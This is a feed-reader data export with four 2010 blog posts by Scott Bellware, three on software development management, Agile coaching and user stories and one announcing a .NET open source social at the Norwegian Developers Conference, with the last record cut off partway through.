{"k":"0000000084","o":"0000013620","v":"001"}
{"_id":1058,"_uid":1058,"_dt":1373742611903,"_s":"6c4c0bd8e2b5b9c52769107bbfea7b35"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/_jtbCWIzoCY/manager-or-bully.html","title":"Manager or Bully?","published":{"$wrap":"$date","v":1283953200009,"h":"2010-09-08T13:40:00.009Z"},"starred":false,"read":false,"content":"Management in the large: managers set expectations for their workers. Of course there's more to it, but \"setting expectations\" covers a lot of ground.<br /><br />Management is central to the productivity crisis we face in software development. It's a crisis that pervades software development so profoundly that we usually don't recognize it. It's like water to a fish - not something that our attention is drawn to, not something that we notice. It's the environment that encloses everything we do. It's not that we see it as normal, we just fail to see it at all. Frustration, burnouts, blown budgets, missed expectations, and dissatisfied customers; it's just the way that most software development is done.<br /><br />We start with the best of intentions, and despite our intentions, we usually end up in the weeds. We end up in the weeds most of the time because that is where software development teams are directed. It's because of one salient, painful truth about software development:<br /><br />Software development managers don't understand the work of software development sufficiently to be able to direct the work of software development, and the value of hands-on work experience they've had in the past decays so rapidly that it's increasingly unsafe to make new decisions based on it.<br /><br />Said more plainly: at a time when senior staff should be best informed by their lengthy and varied experience, they remove themselves from the work of software development long enough to lose the understanding of how day-to-day software development work is done. They lose the knowledge needed to direct the work of day-to-day software development. A certain egoic mania takes root that leads senior staff to feel entitled to believe that their insight has moved beyond the necessity of mere practical work experience.<br /><br />How long does it take to become unqualified to set expectations for software development work? Not long. It happens as quickly as six months and often not longer than two years. This is why the proposition of Self-Directed Work Teams that has been popularized by new, opportunistic interpretation of Agile Methods has become so attractive in software development - even though SDWT is a well-known failure mode in most development industries and is known to be sustainable for no longer than a couple of years in the majority of cases (there are exceptions, but exceptional organizations usually aren't the rule for unexceptional organizations, despite our best hopes and ideals).<br /><br />Plotting software development management on a continuum between the extremes of Managers and Bullies, we don't find many managers who are only either extreme. A software development authority is rarely either only a manager or only a bully, but software development managers are usually weighted more toward the bully end of the spectrum. It's an innevitable consequence of having lost interest in the details of software development work, and having become quickly dated as a consequence.<br /><br />Someone who sets expectations but who isn't able to show workers how to fulfill expectations isn't managing, he's using the implicit threat of crossing an authority to make demands without knowing if those demands can be met. And he's hoping for the best. But we need more than hope to manage software development. We need to know that the work being done every day is the work that leads to the desired outcomes.<br /><br />Setting expectations without knowing how to meet those expectations almost always leads to unqualified or unrealistic expectations. Using authority to require unrealistic expectations to be met always creates a compounding accumulation of obstructions to subsequent work. It's a sure-fire path to lower productivity. Most software development organizations live perpetually under this cloud of depressed productivity.<br /><br />A bully sets expectations for workers but doesn't have the relevant and necessary capacities to help those workers fulfill the expectations. A bully has been disconnected from work for long enough that he (or she) is no longer able to personally act to ensure that his workers meet his expectations - to show them how the work is done, and to qualify the work that they do.<br /><br />In other words, the person who needs to be the most experienced and most expert software development worker on the team is often the least capable.<br /><br />A direct manager knows how the work should be done. He may know this better than his workers. When necessary, a manager can sit down with the worker's current tools, and teach the worker how to meet expectations, and to teach the worker how the specifics and tactics are tied to a greater whole. A bully hides behind assertions that his time and intellect are too valuable to be spent on such trivialities as the \"how\" of doing the work in his purview.<br /><br />It's fair for a person with authority to no longer have the capacity to ensure that workers are materially able to meet expectations, but then that authority must defer to someone who does have the necessary and relevant capacity. And this is an entirely undesirable circumstance. It might be the circumstance that you're dealing with, but it's not the one you should settle for.<br /><br />An authority who isn't capable of knowing whether and how work can be accomplished and whether expectations can be met is qualified to set only summary expectations. An authority who over-steps the material bounds of his capacity will continue to inject productivity obstructions into his organization's workflow by causing workers to make unsafe and counterproductive decisions that innevitably lead to rework, overwork, and relearning.<br /><br />A bully believes that his workers are soft and lazy, and often puts extra pressure on workers believing that this is what it takes to get merely nominal productivity. A manager recognizes that workers who retreat from work are likely facing some distressing obstructions in the workflow. He uses his skills as a teacher and his insights into the work as an expert worker to help his workers to recognize and clear obstructions.<br /><br />It's often hard for us to accept the cold reality of the depressed productivity in our organizations. We fail to manage software development as a product development discipline and tend to manage it as a manufacturing discipline (usually without even understanding or recognizing the difference), undermining productivity at every turn by tuning the wrong variables and turning the wrong organizational and procedural knobs.<br /><br />In an environment where management leans more to the bully side of the continuum, we see work teams stretch the intentions of \"self-organization\" into the realm of \"self-determination\" or \"self-direction\". It's not necessarily an unwarranted reaction, but its a reaction to a root cause that should be the focus of organizational and procedural improvement. It's in these environments that we also see a need for coaches to fill in the management void, but this is also a lesser palliative that doesn't necessarily get to the heart of the matter.<br /><br />A manager is someone who balances qualified and expert worksmanship with the ability to teach and is comfortable with using directed authority when necessary. He goes with his team into new learning and new understanding, and re-directs the team if the creative drive for experimentation starts to occlude the imperatives of delivering material product.<br /><br />Doubtlessly, it's sensationalistic to divvy up the software development management landscape into extremes, but doing so is meant to frame the issue so that we can begin to recognize a real problem and begin to do something about it.<br /><br />The way that software development is practiced at large, it's perfectly understandable for software development workers to become burned out on software development, and to look for a change. Unfortunately, moving upward to software development management isn't where people who are burned out on this work should go. It's little more than an escape, and it needs to be more of a deeper commitment to the work rather than a means to justify avoiding the details.<br /><br />Ultimately, software development work will remain palatable for much longer when it is managed much better. But we are where we are, and the general population of software development managers will remain skewed heavily toward refugees from the work of software development for some time.<br /><br />This is the software management crisis: software development managers at large aren't experts in software development work now, and they often weren't expert workers in the days when they were hands-on. They were the people who came to dislike the work enough to want to escape to software development management. They usually don't know enough about the details of the work to understand how subtle decisions can result in tremendous outcomes, and which decisions lead to tremendously good outcomes, or tremendously poor outcomes.<br /><br />Today's software development managers largely haven't made a study of managing software development and the principles of product development work and work management. Software continues to be managed as one would manage material assembly or manufacturing. Our current generation of managers isn't aware of this problem because software development management hasn't really been a field of interest for most of them - it's just the job that they have, and it's one that keeps them from having to work in the painful niggling details of poorly-managed software.<br /><br />None of this suggests that we need to wipe the halls of software development management clean and start from scratch with newly-installed personnel lifted from the rank-and-file. One of the worst mistakes that our current management ideology continues to make is the failure to recognize the material cost of losing institutional knowledge when we lose any worker (NOTE: the flip side of this problem is the colloquial horror of not knowing who to hire, and bringing people into our organizations that we dismiss in short order).<br /><br />The software development mangers that we have today may have become burned out on the details of software development, but those details can be changed to make the work less tiresome, and make the work less like an uphill battle being fought on a cliff face rather than a gentle slope. Their institutional knowledge is far too valuable to lose. Their many years of experience - if paired with a sharper understanding of which decisions make software development good and which make it bad - provides a perspective of the whole of the effort that is invaluable.<br /><br />It's entirely reasonable to expect that we can transform the software development industry. The root of the problem is in the software development management system. When software development managers are willing to look without flinching into the reality of their situation and the circumstances that have led to their positions, then we can begin to rehabilitate the system. When that happens, many of the software development industry's most futile pathologies will fall by the wayside and we'll begin to tap the potential that is this industry's unclaimed birthright.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=_jtbCWIzoCY:05cfIfRJsXI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=_jtbCWIzoCY:05cfIfRJsXI:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=_jtbCWIzoCY:05cfIfRJsXI:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=_jtbCWIzoCY:05cfIfRJsXI:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=_jtbCWIzoCY:05cfIfRJsXI:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=_jtbCWIzoCY:05cfIfRJsXI:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=_jtbCWIzoCY:05cfIfRJsXI:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=_jtbCWIzoCY:05cfIfRJsXI:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=_jtbCWIzoCY:05cfIfRJsXI:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/_jtbCWIzoCY\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1058}}
{"k":"0000000084","o":"0000012114","v":"001"}
{"_id":1059,"_uid":1059,"_dt":1373742611903,"_s":"b6bd40961e201c6b938f54e756cc1184"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/H7Tle_fgelA/unfortunate-case-of-agile-coaching-and.html","title":"The Unfortunate Case of Agile Coaching and Servant Leadership","published":{"$wrap":"$date","v":1284126000041,"h":"2010-09-10T13:40:00.041Z"},"starred":false,"read":false,"content":"The need for coaches, and especially servant leaders, is a side-effect of an unfortunate organizational pathology.<br /><br />Consider this quote from James P. Womack: \"We've got too little management and therefore need too much leadership\".<br /><br /><object width=\"480\" height=\"385\"><param name=\"movie\" value=\"http://www.youtube.com/v/96EasliJuuA?fs=1&hl=en_US\"><param name=\"allowFullScreen\" value=\"true\"><param name=\"allowscriptaccess\" value=\"always\"><embed src=\"http://www.youtube.com/v/96EasliJuuA?fs=1&hl=en_US\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"480\" height=\"385\"></embed></object><br /><br />Someone who has become specialized as an Agile coach necessarily benefits from the perpetuation of Agile coaching. This doesn't mean that Agile coaches are nefarious and interested in suboptimal outcomes, but perpetuated specialization typically creates narrowed perspectives and thus overly-narrow interpretations of conditions and needs.<br /><br />The result is often the very same counter-productivity that we observe when someone is given the exclusive job of capturing requirements for a software project: they fill all of their time exercising their specialization, creating an inventory of work that is out of sync with the progress of the team.<br /><br />When we bring Agile coaches into software development efforts, we should recognize the underlying problem that is being signaled: that software development managers are not presently equipped to manage the software development work that they've been tasked to manage.<br /><br />By failing to recognize the underlying problem, we often go too lightly into engagements with Agile coaches, and we end up failing to use them to solve the root cause problem, and this perpetuates the need for longer engagements with Agile coaches. This, in turn, drives Agile coaches further into the reaches of specialization, and narrower perspectives, accelerating the erosion of their usefulness.<br /><br />To break this cycle, we need to recognize the most important reason to bring on an Agile coach: The purpose of an Agile coach is to transform managers and the management system so that managers, in turn, can transform<span style=\"font-style: italic;\">their</span>organizations.<br /><br />Coaches initially take on responsibilities that ultimately need to be the responsibilities of a manager. Even if the outcome is an improvement, when a manager's job is split between an authority position (the Boss), and a guidance position (the Coach), the outcome isn't as good as it can and should be. Nonetheless, if a manager is in a position to need a coach, then the coach is inevitably going to take on some of the manager's responsibilities for teaching and transformation while the manager undergoes rehabilitation of his own.<br /><br />The coach and the manager must recognize that these conditions are a necessary evil. The goal is a transition away from the split direction of a team between a manager and a coach. The longer that this split is in place, the higher the likelihood that the new behaviors learned by the team will be undone by the manager when the coach moves on.<br /><br />Agile coaches can find themselves as removed from the work of software development as the managers that they are called to rehabilitate in the work. For an Agile software development coach to remain effective, he has to be an active software developer. Just as managers fall into the trap of<a href=\"http://blog.scottbellware.com/2010/09/manager-or-bully.html\" target=\"_blank\">losing software development currency</a>, so do Agile coaches. An Agile coach who doesn't<span style=\"font-style: italic;\">also</span>do software product development for a living is a ticking timebomb of counter-productive guidance for a software development team.<br /><br />Consider this quote from<a href=\"http://www.whattofix.com/blog/archives/2010/09/agile-ruined-my.php\" target=\"_blank\">Daniel Markham</a>: \"If you're going to train something, you should be able to do it. And I mean do it to a very high level of expertise. An agile coach should be able to code, perform analysis, manage the project, test -- anything that needs doing on a project. If she can't, then how can you talk to her about your particular situation? If your agile trainer was a BA last week, or never slung code in his life, or is a professional trainer, or -- let's be brutally honest -- is making less than the members of the team are, you've got a dud. It seems like common sense but it bears repeating: you can't train something you haven't done. And \"done\" means a bunch of times, not just on the pilot project.\"<br /><br />The qualities and abilities that Daniel outlines are qualities and abilities that we need to expect from software development managers. If they don't have those qualities and abilities, they need to get them, and a coach might be a way to get there. If the coach doesn't have those qualities and abilities, most of what's produced during the engagement doesn't become lasting, transformative value.<br /><br />Agile coaches who themselves don't know the work of software development can't teach managers to know the work sufficiently to manage it. They can only teach them to become other disconnected Agile coaches. This is how the second half of the first decade of Agile came to be dominated by the doctrine of Servant Leadership. As more senior leaders in the Agile community spend more and more time in roles that are ever distant from the work of software development, Agile itself is becoming more robotic, more mindless, more of an orthodoxy, and even more of a liability than a benefit.<br /><br />Servant leadership is one approach - one tool - fit for the organizational conditions that it serves best. An Agile coach often embraces the edicts of servant leadership as a universal panacea when his duty to stay sharp in the full curriculum of software development is dulled by the ease of Agile coaching specialization. But any tool used indiscriminately is going to undo any benefits that it provided in the circumstances where it was an appropriate choice.<br /><br />A servant leader's typical proposition is that an organization's ability to meet expectations will be transformed if only its inherent creativity can be tapped and unleashed. While tapping and unleashing unused creativity is transformative, it's extremely rare that doing so is either sufficient or sustainable. It often creates conditions that not only lead to unmethodical exploration of ideas, but also makes teams feel that they have a right to this kind of behavior. In other words: \"self-determination\" rather than \"self-organization\".<br /><br />Servant Leadership as a panacea is also a real side-effect of past experiences with bully management. It's an over-compensation reaction to some very real and very tangible painful experiences of abusive directed authority. It's an equal and opposite reaction to an extreme. It, as well, is an extreme. It's as much an undesirable specialization of behavior as abusive directed authority. It's often a programmed predisposition, rather than a conscious choice informed by circumstance.<br /><br />The Servant Leadership doctrine often patently dismisses the greater goal of balance between directed authority and creative enablement, almost entirely eschewing the value of<span style=\"font-style: italic;\">informed</span>directed authority and<span style=\"font-style: italic;\">skilled</span>directed authority in favor of an over-indulged creative enablement.<br /><br />A job in creative enablement is a lot of fun, and many Agile coaches have come to feel entitled to these kinds of engagements. They're light, they're fluffy, they can come with no measurable expectations, and they're often damned lucrative - especially in software organizations in the thick of the detritus of an unrecognized management crisis.<br /><br />The increasing prevalence of Servant Leadership also presents a great opportunity for consultants with little real experience in Agile to re-brand themselves as Agile consultants. It allows for anyone with even a modicum of summary knowledge of Agile development to have a role in the Agile bonanza. But we all lose when this happens.<br /><br />If you don't already know what your problem is, then pre-supposing an Agile(tm) solution further deepens the mindlessness of robotic management, and it diminishes the Agile body of knowledge. And ultimately, it exposes our organizations to the risks of bringing in help that may only have the ability to talk the talk - which is often all that is required of Servant Leadership - and often all that servant leaders assert is required of them.<br /><br />Again from<a href=\"http://www.whattofix.com/blog/archives/2010/09/agile-ruined-my.php\" target=\"_blank\">Daniel Markham</a>: \"One guy (famous author again) basically put it like this to me when I told him the team wasn't succeeding: I'm here to demonstrate certain practices and to show that they work, not to just stop everything and attend to what the team is dealing with today.\"<br /><br />To move forward through this crisis, we need to set new goals for software development management: To be close enough to the work to be able to manage work, and to use directed authority in service of helping the team meet expectations when creative enablement turns \"self-organization\" into entitlements for excessive experimentation.<br /><br />And we need to re-define the role of coaches from servant leaders to temporary co-managers, helping the team to meet expectations while bully management and its detritus is transformed into effective software development management.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=H7Tle_fgelA:ZiUCtxXmVFU:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=H7Tle_fgelA:ZiUCtxXmVFU:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=H7Tle_fgelA:ZiUCtxXmVFU:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=H7Tle_fgelA:ZiUCtxXmVFU:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=H7Tle_fgelA:ZiUCtxXmVFU:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=H7Tle_fgelA:ZiUCtxXmVFU:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=H7Tle_fgelA:ZiUCtxXmVFU:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=H7Tle_fgelA:ZiUCtxXmVFU:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=H7Tle_fgelA:ZiUCtxXmVFU:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/H7Tle_fgelA\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1059}}
{"k":"0000000084","o":"0000008983","v":"001"}
{"_id":1060,"_uid":1060,"_dt":1373742611904,"_s":"ebc1a9f48d72e3fb70667bcb3ffec3fc"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/7zP3gI6GUYY/user-stories-are-temporary.html","title":"User Stories are Temporary","published":{"$wrap":"$date","v":1285685700003,"h":"2010-09-28T14:55:00.003Z"},"starred":false,"read":false,"content":"It's obvious, but warrants mention: What we do in the future is likely to be different from what we're doing today. The implications for user stories should be obvious: User stories are temporary. Saving them for posterity doesn't serve the primary purpose of user stories, and doing anything that makes them less temporary can turn user stories from benefit to detriment.<br /><br />User stories are a bit of semi-refined raw material that systems are created from. They're a way to represent users' needs. Most importantly, they communicate an understanding of users' context to the people who are building the software. User stories help to make it more difficult for software development teams to succumb to the ever-present threat of losing track of the user's bigger picture.<br /><br />Aside from raw human ideas that user stories represent, they are the most flexible artifact in software development. Then can be created at any time. They can be changed at will. They can be combined. They can be subdivided. They're not intended to become fixed, and anything that serves to make them fixed is a disservice to the value they offer. User stories aren't fixed in a point in time, just as needs aren't fixed. They change because conditions change. They change because our own understandings change and improve as we gain the clarity that comes from working with user stories, and from building the products that satisfy needs.<br /><br />When we realize new clarity, our responsibility is to reflect that new clarity in the form of new stories, or new subdivisions of existing user stories, or through the combination of existing user stories, and even from the removal of user stories from the product definition entirely.<br /><br />The user stories that describe our needs tomorrow are going to be different from today's. Knowing this as we do, we have we gone from recognizing the transient, temporary nature of user stories to the point where we now tend to capture them in tools that make them harder and to change, and harder to take in at a glance and to glean new clarity from. When we do this, we're increasingly unlikely to update user stories to reflect the improved understand we cultivate as we work with them, with users, and with the software that we're developing.<br /><br />The more that we calcify user stories in ever more concrete media, the less we make necessary course corrections along the way. There is little that so obviously contradicts \"Agile\" more than inviting anything that adds to the calcification of requirements. A principle duty of user story management in Agile development is to protect them from becoming encumbered by the notions of permanence that obstructed software development methodologies that predate the effectiveness of Agile methods.<br /><br />We pat ourselves on the back for having evolved beyond the quintessentially-primitive \"300-page requirements document\", but often all we're doing is bringing some of the same old problems forward to our \"new\" requirements formats. Sure, we've outgrown the massive, big-batch requirements doc, but the genetic material of the disease that infected those documents have evolved into a newer problem for newer artifacts, and ultimately, the problem is still the same essential problem. We're so pleased with ourselves for our new Agile ways that we fail to see that we're repeating the same mistakes, except with new material.<br /><br />Here are some things to keep in mind that can help with the relapse into the same old mistakes:<br /><br />1. When you forget why you're doing something the way you do, the answer isn't in a user story archive. The answer is in revisiting what you're doing to make sure that it still holds true. Do this with interactions and with people. Use tools and processes to support the human interactions.<br /><br />2. User stories are not artifacts for regulatory compliance. User stories are a scratch pad of human understanding at the present moment. They are chuck for the software development grinder. What comes out the other end should be the software that itself explains why things are as they are. If you need a permanent record for the purposes of regulatory compliance, go ahead and create one. Nothing in Agile stops you from doing that. Just don't hang a stasis anchor around the neck of user stories. If you do, you'll strip them of the benefit that they bring to software delivery.<br /><br />3. Have one master copy of a user story while that user story is in-progress. The master copy should be the one that is most immediately accessible to the most people who are involved in turning ideas into software products. They should be be posted using the most visible medium possible - one that requires the least amount of human interaction to casually-scan a project's gallery of user stories.<br /><br />4. Throw user stories away once you deliver the working software that addresses the needs expressed by user stories. The software and its supports are enough to describe why it is the way it is. If you no longer remember, and if the software and its supports and the mechanisms and practices of institutional memory aren't sufficiently self-descriptive, revisit all of these issues as an opportunity to improve the production system in a way that doesn't invite more tool-centric bureaucracy.<br /><br />Here's a bit of a side note to consider: The principle sponsors of the Agile 2010 conference are both \"Agile\" tool vendors.<br /><br />If one of Agile development's primary tenants is to value people and interactions over processes and tools, how is it that the only Agile organizations producing enough disposable income to support Agile development itself are tool and process companies specializing in Agile requirements management and requirements compliance? Somehow, we've walked in a circle - yet again. And one of the things we've left on the trail behind us is the understanding of how things went wrong last time, as well as our commitment to avoid expediencies that don't serve sustainability.<br /><br />The process methodologies that predate Agile are often roundly dismissed by agilists. But there wasn't really inherently wrong with them. Things back then started getting silly when tools started getting silly; when we began to defer to tools as authorities rather than to the people needing and the people solving needs.<br /><br />One of the first definitive steps into the downward spiral of mindless process bureaucracy hell is the calcification of requirements. And no matter how temping it is to succumb to the materialism of hardened collections of user stories, we don't get to hell without passing through those gates.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=7zP3gI6GUYY:TGUeeWKO2Rk:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=7zP3gI6GUYY:TGUeeWKO2Rk:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=7zP3gI6GUYY:TGUeeWKO2Rk:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=7zP3gI6GUYY:TGUeeWKO2Rk:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=7zP3gI6GUYY:TGUeeWKO2Rk:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=7zP3gI6GUYY:TGUeeWKO2Rk:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=7zP3gI6GUYY:TGUeeWKO2Rk:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=7zP3gI6GUYY:TGUeeWKO2Rk:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=7zP3gI6GUYY:TGUeeWKO2Rk:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/7zP3gI6GUYY\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1060}}
{"k":"0000000084","o":"0000006060","v":"001"}
{"_id":1061,"_uid":1061,"_dt":1373742611904,"_s":"74381726db3179d42691f4cfcc1a7a43"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/y8ns4QM5u20/monospace-net-open-source-social-at.html","title":"Monospace: .NET Open Source Social at the Norwegian Developers Conference","published":{"$wrap":"$date","v":1271766600008,"h":"2010-04-20T12:30:00.008Z"},"starred":false,"read":false,"content":"<a href=\"http://monospace.us\"><br /><img border=\"0\" alt=\"Monospace\" src=\"http://1.bp.blogspot.com/_rt8zZqKCZSg/S8y-0nt0s0I/AAAAAAAAAHo/JfDTLLPlqcU/s320/monospace_logo.png\" target=\"_blank\" /><br /></a><br />I'm very excited to be working with the folks at the Norwegian Developers Conference (NDC) in Oslo from June 16th to 18th on a very special event.<br /><br />On Wednesday evening, June 16th, we'll be celebrating open source software in the .NET space with members of the Mono Project as well as NDC speakers and attendees from the .NET open source community, and the open source curious. Cap off your day with complimentary refreshments and a look at some of the community projects that have changed the face of .NET.<br /><br />Did you know that you can run .NET applications on iPhone and Android using the Mono Project's open source implementation of the .NET stack? Mono will also let you run your apps in powerful and mature cloud platforms like Amazon EC2 and build for special purpose hardware platforms. Want to deploy your apps to Linux and Mac? No problem, that's what Mono does for you. Use your C# skills to go further than you ever thought possible, and you don't even have to leave Visual Studio!<br /><br />Not only has the open source community made cross-platform .NET development a reality for all .NET developers, but open source provides a wealth of development tools that have become the leading indicator and the gold standard for where .NET software development is heading. Unit testing, ORM, build scripts, UI testing, MVC, continuous integration, source control... all of these fields were led by open source efforts years before they started showing up in commercial products. Stop waiting to find out where .NET development is going! Come to Monospace and greet the future right here in the present!<br /><br />If you don't have any experience with open source, join the party and see what the fuss is about. Learn about the wealth of tools available to you as a .NET developer, made available by some of the most accomplished and expert developers in the community. Get your questions answered by the pros, and get tips on how to augment your projects and your skills with the vast array of mature, stable, open source tools and products. This event is for you. You don't have to be an open source hacker to enjoy Monospace. Stick around and indulge your curiosity!<br /><br />If you're an open source user, add your voice to the conversation. There will be plenty of .NET developers with questions to answer and experiences to share. Participate in discussions and demonstrations and even get a chance to learn about projects that you haven't heard of yet. Bring your laptop and sit down with open source contributors and users for a little hacking and show and tell!<br /><br />Join Jackson Harper of the Mono Project, as well as myself, and many of the NDC speakers and attendees for a fun night of sharing and networking at the Monospace social.<br /><br />Check out this list of NDC people who are open sourcers: Rob Conery, Scott Allen, Ben Hall, Roy Osherove, James Gregory, Greg Young, Jon Skeet, Robert C. Martin, Michael Feathers, Louis Dejardin, Sebastien Lambla, Shay Friedman, Anders Norås, Kevlin Henney, Lisa Crispin, Richard Campbell. And that's just a partial list! Come out to Monospace and find out what attracts these leading thinkers and practitioners  to open source solutions.<br /><br />Expand your .NET horizons at the Monospace social at the Norwegian Developers Conference. Information, links, and more at:<a href=\"http://monospace.us/\">Monospace.us</a><br /><br />Also, checkout the NDC conference agenda for great sessions on Mono and .NET open source at:<a href=\"http://www.ndc2010.no/agenda.aspx\">www.ndc2010.no</a><br /><a href=\"http://ndc2010.no\"><br /><img border=\"0\" alt=\"Norwegian Developers Conference\" src=\"http://1.bp.blogspot.com/_rt8zZqKCZSg/S827CjNDumI/AAAAAAAAAHw/1Qin6sB6eOI/s320/ndc2010_logo.png\" target=\"_blank\" /><br /></a><br />Many thanks to the Norwegian Developers Conference for supporting and sponsoring the Monospace social, and for making it happen.<br /><br />See you there!<div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=y8ns4QM5u20:bllo4F3Nvcg:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=y8ns4QM5u20:bllo4F3Nvcg:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=y8ns4QM5u20:bllo4F3Nvcg:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=y8ns4QM5u20:bllo4F3Nvcg:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=y8ns4QM5u20:bllo4F3Nvcg:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=y8ns4QM5u20:bllo4F3Nvcg:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=y8ns4QM5u20:bllo4F3Nvcg:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=y8ns4QM5u20:bllo4F3Nvcg:gIN9vFwOqvQ\" border=\"0\"></img></a><a 